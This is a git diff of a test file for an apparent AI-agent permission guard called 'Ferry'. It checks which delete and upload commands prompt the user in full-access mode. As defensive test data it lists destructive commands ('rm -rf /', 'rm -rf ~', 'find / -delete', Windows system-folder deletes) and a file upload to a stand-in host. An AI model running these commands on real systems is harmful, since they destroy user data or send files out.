@@ -7,6 +7,7 @@ import { test } from "node:test";
 
 process.env.FERRY_HOME = mkdtempSync(join(tmpdir(), "ferry-perm-"));
 const P = await import("../lib/permissions.mjs");
+const { FERRY_HOME: FERRY_HOME_DIR } = await import("../lib/config.mjs");
 const cwd = mkdtempSync(join(tmpdir(), "ferry-proj-"));
 const none = { allow: [], ask: [], deny: [] };
 const d = (tool, input, mode = "default", rules = none) =>
@@ -197,13 +198,13 @@ test("delete targets are listed, or null when they cannot be", () => {
 	}
 });
 
-test("in full access, deletes go ahead only for what this session made", () => {
+test("outside full access, deletes go ahead only for what this session made", () => {
 	const proj = mkdtempSync(join(tmpdir(), "ferry-del-"));
 	writeFileSync(join(proj, "old.txt"), "x");
 	mkdirSync(join(proj, "mixed"));
 	writeFileSync(join(proj, "mixed", "old.txt"), "x");
 	const session = { start: Date.now() + 60_000, made: new Set() }; // everything on disk is older than the session
-	const v = (command, s = session) => P.decide({ tool: "bash", input: { command }, mode: "bypass", cwd: proj, rules: none, session: s });
+	const v = (command, s = session) => P.decide({ tool: "bash", input: { command }, mode: "default", cwd: proj, rules: none, session: s });
 	assert.equal(v("rm old.txt").action, "ask");
 	assert.match(v("rm old.txt").danger, /old\.txt, which Ferry did not create/);
 	assert.ok(v("rm old.txt").always);
@@ -238,112 +239,132 @@ test("in full access, deletes go ahead only for what this session made", () => {
 	assert.equal(P.decide({ tool: "bash", input: { command: "rm old.txt" }, mode: "default", cwd: proj, rules: none, session }).action, "ask");
 });
 
-test("full access: deleting inside the temp folder does not ask, whenever it was made", () => {
-	const root = mkdtempSync(join(tmpdir(), "ferry-tdel-"));
-	const proj = join(root, "proj");
+test("full access: a delete asks only when it hits a protected place", () => {
+	const root = mkdtempSync(join(tmpdir(), "ferry-prot-"));
+	const home = join(root, "home");
+	const proj = join(home, "work", "proj");
 	const temp = join(root, "temp");
-	mkdirSync(join(temp, "task", "sub"), { recursive: true });
-	mkdirSync(proj);
-	writeFileSync(join(temp, "task", "old.txt"), "x");
-	writeFileSync(join(temp, "task", "sub", "old2.txt"), "x");
+	mkdirSync(join(home, "Documents", "x"), { recursive: true });
+	mkdirSync(proj, { recursive: true });
+	mkdirSync(join(temp, "task"), { recursive: true });
 	writeFileSync(join(proj, "old.txt"), "x");
-	const session = { start: Date.now() + 60_000, made: new Set() }; // everything on disk is older than the session
+	writeFileSync(join(home, "Documents", "x", "a.txt"), "x");
 	const fwd = (p) => p.replaceAll("\\", "/");
-	const v = (command, o = {}) => P.decide({ tool: "bash", input: { command }, mode: "bypass", cwd: proj, rules: none, session, tempDir: temp, ...o });
-	assert.equal(v(`rm ${fwd(join(temp, "task", "old.txt"))}`).action, "allow");
-	assert.equal(v(`rm -rf ${fwd(join(temp, "task"))}`).action, "allow"); // a folder: everything in it is inside temp
-	assert.equal(v(`rm -rf ${fwd(join(temp, "task", "*.txt"))}`).action, "allow");
-	assert.equal(v("rm old.txt").action, "ask"); // the project is not the temp folder
-	assert.equal(v(`rm -rf ${fwd(temp)}`).action, "ask"); // the temp folder itself
-	assert.equal(v(`rm ${fwd(join(temp, "task", "old.txt"))}`, { tempDir: "" }).action, "ask");
-	assert.equal(v(`rm ${fwd(join(temp, "task", "old.txt"))}`, { mode: "acceptEdits" }).action, "ask"); // other modes are unchanged
-	assert.equal(v(`rm ${fwd(join(temp, "task", "old.txt"))} ${fwd(join(proj, "old.txt"))}`).action, "ask"); // one target outside
-	P.noteCreated(session, join(proj, "made.txt"));
-	writeFileSync(join(proj, "made.txt"), "x");
-	assert.equal(v(`rm ${fwd(join(proj, "made.txt"))} ${fwd(join(temp, "task", "old.txt"))}`).action, "allow"); // a mix is fine
-	// a link inside the tree: Remove-Item -Recurse on a junction can reach the real folder
-	let linked = false;
+	const saved = [process.env.HOME, process.env.USERPROFILE];
+	process.env.HOME = process.env.USERPROFILE = home;
 	try {
-		symlinkSync(proj, join(temp, "task", "link"), "junction");
-		linked = true;
-	} catch {
-		// no permission to make links here
-	}
-	if (linked) {
-		assert.equal(v(`rm -rf ${fwd(join(temp, "task"))}`).action, "ask");
-		assert.equal(v(`rm ${fwd(join(temp, "task", "old.txt"))}`).action, "allow"); // the file next to it is fine
+		const session = { start: Date.now() + 60_000, made: new Set() }; // everything on disk is older than the session
+		const dec = (command, o = {}) => P.decide({ tool: "bash", input: { command }, mode: "bypass", cwd: proj, rules: none, session, tempDir: temp, ...o });
+		const act = (c, o) => dec(c, o).action;
+		// goes ahead: old files, folders below a protected place, what cannot be listed, an unknown variable
+		assert.equal(act("rm old.txt"), "allow");
+		assert.equal(act("rm -rf *.txt"), "allow");
+		assert.equal(act("rm -rf *"), "allow"); // the contents of the project, not the folder
+		assert.equal(act(`rm -rf ${fwd(join(home, "Documents", "x"))}`), "allow");
+		assert.equal(act("rm -rf ~/Documents/x"), "allow");
+		assert.equal(act(`rm -rf ${fwd(join(temp, "task"))}`), "allow");
+		assert.equal(act(`rm -rf ${fwd(join(temp, "task", "*.txt"))}`), "allow");
+		assert.equal(act("git clean -fd"), "allow");
+		assert.equal(act("ls | xargs rm"), "allow");
+		assert.equal(act(`python3 -c "import shutil; shutil.rmtree('build')"`), "allow");
+		assert.equal(act("find . -name '*.pyc' -delete"), "allow");
+		assert.equal(act("rm $SOMETHING_UNKNOWN/old.txt"), "allow");
+		assert.equal(act("find . -name $PATTERN -delete"), "allow");
+		assert.equal(act(`cd ${fwd(proj)} && git clean -fd`), "allow"); // a cd into the project is not a danger
+		assert.equal(act(`cd ${fwd(join(temp, "task"))} && find . -delete`), "allow");
+		assert.equal(act(`find ${fwd(join(home, "Documents", "x"))} -delete`), "allow");
+		// asks, and says which place
+		const root0 = process.platform === "win32" ? "C:\\" : "/";
+		const ask = (c, re, o) => {
+			const r = dec(c, o);
+			assert.equal(r.action, "ask", c);
+			assert.match(r.danger, re, c);
+			assert.ok(r.always, c);
+		};
+		ask(`rm -rf ${fwd(root0)}`, /filesystem root.*protects even in full access/);
+		ask("rm -rf ~", /home folder.*protects even in full access/);
+		ask(`rm -rf ${fwd(home)}`, /home folder/);
+		ask("rm -rf ~/Documents", /Documents.*a folder directly in your home folder, which Ferry protects even in full access/);
+		ask(`rm -rf ${fwd(join(home, "Documents"))}/`, /directly in your home folder/);
+		ask("rm -rf ~/*", /protects even in full access/); // matches the folders in home
+		ask(`rm -rf ${fwd(root)}/*`, /contains|protects/); // a glob matching home
+		ask(`rm -rf ${fwd(root)}`, /contains/); // a folder above home
+		ask("rm -rf ..", /protects/); // above the project
+		ask("rm -rf .", /the project folder/);
+		ask(`rm -rf ${fwd(proj)}`, /the project folder/);
+		ask(`rm -rf ${fwd(temp)}`, /temp folder/);
+		ask(`rm -rf ${fwd(FERRY_HOME_DIR)}`, /Ferry's own folder/);
+		ask(`rm old.txt ${fwd(join(home, "Documents"))}`, /Documents/); // one target is enough
+		ask("cd ~ && rm -rf *", /protects even in full access/);
+		ask("cd ~; rm -rf *", /protects even in full access/);
+		ask("cd && rm -rf *", /protects even in full access/);
+		ask("cd ~/Documents && rm -rf *", /Documents/); // a wildcard right in a protected folder empties it
+		ask("rm -rf ~/Documents/*", /Documents/);
+		ask("rm -rf ~/Documents/*.txt", /Documents/);
+		ask(`rm -rf ${fwd(join(home, "Documents"))}/*`, /Documents/);
+		ask(`rm -rf ${fwd(FERRY_HOME_DIR)}/*`, /Ferry's own folder/);
+		ask("find ~/Documents/* -delete", /Documents/);
+		assert.equal(act("rm -rf ~/Documents/x/*"), "allow"); // one level down is fine
+		assert.equal(act(`rm -rf ${fwd(join(temp, "*"))}`), "allow"); // the temp folder's contents
+		assert.equal(act(`rm -rf ${fwd(proj)}/*`), "allow"); // the project's contents
+		assert.equal(act("rm -rf *"), "allow");
+		assert.equal(act(`cd ${fwd(temp)} && rm -rf *`), "allow");
+		ask("cd ~/Documents && find . -delete", /after changing folder to .*Documents/);
+		ask("cd / && find . -delete", /root/);
+		ask("cd .. && find . -delete", /protects/);
+		ask("Set-Location ~ ; Get-ChildItem | Remove-Item", /protects/);
+		ask("find ~ -delete", /home folder/);
+		ask("find $HOME -delete", /home folder/);
+		ask("find / -name x -delete", /root/);
+		ask(`find ${fwd(join(home, "Documents"))} -delete`, /Documents/, { cwd: join(home, "Documents", "x") });
+		ask(`python3 -c "import shutil; shutil.rmtree('${fwd(join(home, "Documents"))}')"`, /Documents/); // inside quoted code
+		ask(`python3 -c "import shutil; shutil.rmtree('${fwd(proj)}')"`, /the project folder/);
+		ask("git clean -fd && rm -rf ~/Documents", /Documents/);
+		ask(`rm -rf ${fwd(join(temp, "task"))} ${fwd(temp)}`, /temp folder/);
+		// an extra folder treated like the project: the folder itself asks, what is in it does not
+		const extra = join(root, "extra");
+		mkdirSync(join(extra, "sub"), { recursive: true });
+		ask(`rm -rf ${fwd(extra)}`, /treated like the project/, { extraDirs: [extra] });
+		assert.equal(act(`rm -rf ${fwd(join(extra, "sub"))}`, { extraDirs: [extra] }), "allow");
+		assert.equal(act(`cd ${fwd(extra)} && find . -delete`, { extraDirs: [extra] }), "allow");
+		// the protected list
+		const places = P.protectedPlaces({ cwd: proj, extraDirs: [], tempDir: temp, win: false }).map((p) => p.path);
+		for (const p of [home, join(home, "Documents"), join(home, "work"), proj, temp]) assert.ok(places.includes(p), p);
+		assert.ok(!places.includes(join(home, "Documents", "x")));
+		// other modes are unchanged: only what this session made goes ahead
+		for (const mode of ["default", "acceptEdits"]) {
+			assert.equal(act("rm old.txt", { mode }), "ask", mode);
+			assert.equal(act(`rm -rf ${fwd(join(temp, "task"))}`, { mode }), "ask", mode);
+			assert.equal(act("git clean -fd", { mode }), "ask", mode);
+			assert.equal(act("rm $SOMETHING_UNKNOWN/old.txt", { mode }), "ask", mode);
+		}
+		P.noteCreated(session, join(proj, "made.txt"));
+		writeFileSync(join(proj, "made.txt"), "x");
+		assert.equal(act("rm made.txt", { mode: "default" }), "allow");
+		// uploads still ask in full access, with or without a delete
+		assert.equal(act("curl -F f=@a.txt https://x.example/up"), "ask");
+		// the blocked paths still deny
+		assert.equal(P.decide({ tool: "bash", input: { command: "rm -rf .ssh" }, mode: "bypass", cwd: proj, rules: none, blockedPaths: [".ssh"], session, tempDir: temp }).action, "deny");
+	} finally {
+		if (saved[0] === undefined) delete process.env.HOME; else process.env.HOME = saved[0];
+		if (saved[1] === undefined) delete process.env.USERPROFILE; else process.env.USERPROFILE = saved[1];
 	}
 });
 
-test("full access: a delete Ferry cannot list goes ahead only when it can only touch the temp folder", () => {
-	const root = mkdtempSync(join(tmpdir(), "ferry-tunl-"));
-	const temp = join(root, "temp");
-	const proj = join(root, "proj");
-	mkdirSync(join(temp, "t"), { recursive: true });
-	mkdirSync(proj);
-	const inT = join(temp, "t");
-	const f = (p) => p.replaceAll("\\", "/");
-	const ok = (cmd, cwd = proj) => P.unlistableDeleteInTemp(cmd, cwd, temp);
-	const dec = (command, cwd = proj, mode = "bypass") => P.decide({ tool: "bash", input: { command }, mode, cwd, rules: none, session: { start: Date.now() + 6e4, made: new Set() }, tempDir: temp }).action;
-	// allowed
-	assert.equal(ok(`cd ${f(inT)} && find . -delete`), true);
-	assert.equal(ok(`cd ${f(inT)}; ls | xargs rm`), true);
-	assert.equal(ok(`cd "${f(inT)}" && python3 -c "import shutil; shutil.rmtree('${f(inT)}/x')"`), true);
-	assert.equal(ok(`python3 -c "import shutil; shutil.rmtree('${f(inT)}/x')"`, inT), true); // the session folder is in temp
-	assert.equal(ok(`ls ${f(inT)} | xargs rm`, inT), true);
-	assert.equal(ok("Get-ChildItem . | ForEach-Object { Remove-Item $_.FullName } ; Write-Output $null", inT), true); // $_ and $null
-	assert.equal(dec(`cd ${f(inT)} && find . -delete`), "allow");
-	assert.equal(dec("find . -delete", inT), "allow");
-	assert.equal(dec(`cd ${f(inT)} && git clean -fd`), "allow");
-	// the dangerous cases ask
-	assert.equal(ok(`find ${f(proj)} -delete`, inT), false); // an absolute path outside temp
-	assert.equal(ok(`cd ${f(inT)} && find . -delete; rm -rf ${f(proj)}`), false); // outside, later in the command
-	assert.equal(ok(`python3 -c "import shutil; shutil.rmtree('${f(proj)}')"`, inT), false); // inside a quoted string
-	assert.equal(ok(`python3 -c "import os; os.remove('${f(inT)}/../x')"`, inT), false); // ..
-	assert.equal(ok("cd .. && find . -delete", inT), false);
-	assert.equal(ok("find . -delete", proj), false); // relative from the project folder
-	assert.equal(ok(`ls ${f(inT)} | xargs rm`), false); // a pipe without the cd
-	assert.equal(ok(`cd ${f(proj)} && find . -delete`), false); // a cd out of temp
-	assert.equal(ok(`cd ${f(inT)} | find . -delete`), false); // the cd must be a plain first step
-	assert.equal(ok("find . -name $PATTERN -delete", inT), false); // a variable Ferry does not know
-	assert.equal(ok("find . -delete -name $(whoami)", inT), false);
-	assert.equal(ok("find / -delete", inT), false);
-	assert.equal(ok("find $HOME -delete", inT), false); // a known variable that points outside
-	assert.equal(ok("find ~/x -delete", inT), false);
-	assert.equal(ok("find //server/share -delete", inT), false);
-	assert.equal(P.unlistableDeleteInTemp("find . -delete", inT, ""), false); // no temp folder
-	assert.equal(dec(`cd ${f(inT)} && find . -delete`, proj, "acceptEdits"), "ask"); // other modes are unchanged
-	assert.equal(dec("git clean -fd"), "ask");
-	// a later cd that can leave the folder without an absolute path
-	for (const later of ["cd -", "cd", "popd", "Pop-Location", "cd a b", "Set-Location -"]) {
-		assert.equal(ok(`cd ${f(inT)}; ${later}; Remove-Item -Recurse x`), false, later);
-		assert.equal(ok(`${later} && find . -delete`, inT), false, later);
+test("full access on Windows: system folders and case-insensitive paths ask", { skip: process.platform !== "win32" }, () => {
+	const proj = mkdtempSync(join(tmpdir(), "ferry-winprot-"));
+	const dec = (command) => P.decide({ tool: "bash", input: { command }, mode: "bypass", cwd: proj, rules: none, session: { start: Date.now() + 6e4, made: new Set() } });
+	for (const c of ["rm -rf C:/Windows", "rd /s /q C:\\WINDOWS", "Remove-Item -Recurse 'C:\\Program Files'", "rm -rf /c/ProgramData", "Remove-Item -Recurse $env:APPDATA",
+		"Remove-Item -Recurse $env:LOCALAPPDATA", "rm -rf D:/", "rm -rf //server/share", "rm -rf /c/users/*", "Remove-Item -Recurse C:\\Windows\\*", "rm -rf C:/Windows/*", "cd C:\\ && Get-ChildItem | Remove-Item",
+		`python -c "import shutil; shutil.rmtree(r'C:\\\\Windows')"`]) {
+		assert.equal(dec(c).action, "ask", c);
 	}
-	assert.equal(ok(`cd ${f(inT)}; cd sub; find . -delete`), true); // a relative cd is fine, .. is banned
-	// links: the delete cannot be listed, so a link anywhere it can reach means ask
-	const lk = join(temp, "lk"); // its own folder: the Windows checks below use inT
-	let linked = false;
-	try {
-		mkdirSync(join(lk, "job"), { recursive: true });
-		symlinkSync(proj, join(lk, "job", "link"), "junction");
-		linked = true;
-	} catch {
-		// no permission to make links here
-	}
-	if (linked) {
-		assert.equal(ok(`cd ${f(join(lk, "job"))} && Get-ChildItem -Recurse | Remove-Item`), false); // the cd target
-		assert.equal(ok("find . -delete", join(lk, "job")), false); // cwd inside temp
-		assert.equal(ok(`ls ${f(join(lk, "job"))} | xargs rm`, lk), false); // a named absolute path (and cwd above it)
-		assert.equal(ok(`python3 -c "import shutil; shutil.rmtree('${f(join(lk, "job", "x"))}')"`, lk), false);
-	}
-	if (process.platform === "win32") {
-		assert.equal(ok(`cd /d ${temp}\\t && rmdir /s /q x`), true);
-		assert.equal(ok(`python -c "import shutil; shutil.rmtree(r'C:\\Users\\x')"`, inT), false);
-		assert.equal(ok(`Get-ChildItem C:\\Users | Remove-Item`, inT), false);
-	}
+	assert.equal(dec("rm -rf C:/Windows/Temp/x").action, "allow");
+	assert.equal(dec("del /s /q old.txt").action, "allow"); // /s and /q are switches, not drives
+	assert.equal(dec("cmd /c del /q x.txt").action, "allow");
 });
 
-test("the guard: an upload prompt has no always-allow; a file the write tool made can be deleted in full access", async () => {
+test("the guard: an upload prompt has no always-allow; an old file can be deleted in full access, the project folder itself asks", async () => {
 	const { createGuard, _state } = await import("../lib/guard.mjs");
 	const proj = mkdtempSync(join(tmpdir(), "ferry-guard-"));
 	writeFileSync(join(proj, "old.txt"), "x");
@@ -361,7 +382,8 @@ test("the guard: an upload prompt has no always-allow; a file the write tool mad
 	assert.equal(await call("write", { path: "made.txt", content: "x" }), undefined);
 	writeFileSync(join(proj, "made.txt"), "x");
 	assert.equal(await call("bash", { command: "rm made.txt" }), undefined);
-	assert.ok((await call("bash", { command: "rm old.txt" }))?.block);
+	assert.equal(await call("bash", { command: "rm old.txt" }), undefined); // full access: an old project file may go
+	assert.ok((await call("bash", { command: "rm -rf ." }))?.block); // the project folder itself asks
 	assert.ok(!options.some((o) => o.startsWith("Always")));
 	_state.mode = "default";
 });
@@ -369,10 +391,11 @@ test("the guard: an upload prompt has no always-allow; a file the write tool mad
 test("real incidents: destructive and exfiltrating commands never run without asking", () => {
 	const all = { allow: ["bash(*)"], ask: [], deny: [] }; // even a blanket allow rule does not let these through
 	const v = (command, mode, rules = none, blockedPaths = []) => P.decide({ tool: "bash", input: { command }, mode, cwd, rules, blockedPaths });
-	// deletes Ferry cannot list or did not make: asked in every mode, with no always-allow; refused in plan mode
+	// deletes Ferry cannot list or did not make: asked in every mode but full access, with no always-allow; refused in plan mode
+	// (full access asks only for protected places, see its own test)
 	for (const c of [`rm -rf "$PWD/../home" 2>/dev/null`, `cd /tmp && rm -rf "$PWD/../home"`, `bash -c "rm -rf ~/x"`, "sh -c 'rm -rf /'",
 		`python -c "import shutil; shutil.rmtree('/Users')"`, "find . -delete", "ls | xargs rm -rf"]) {
-		for (const mode of ["default", "acceptEdits", "bypass"]) {
+		for (const mode of c === "sh -c 'rm -rf /'" ? ["default", "acceptEdits", "bypass"] : ["default", "acceptEdits"]) {
 			for (const rules of [none, all]) {
 				const r = v(c, mode, rules);
 				assert.equal(r.action, "ask", `${mode}: ${c}`);
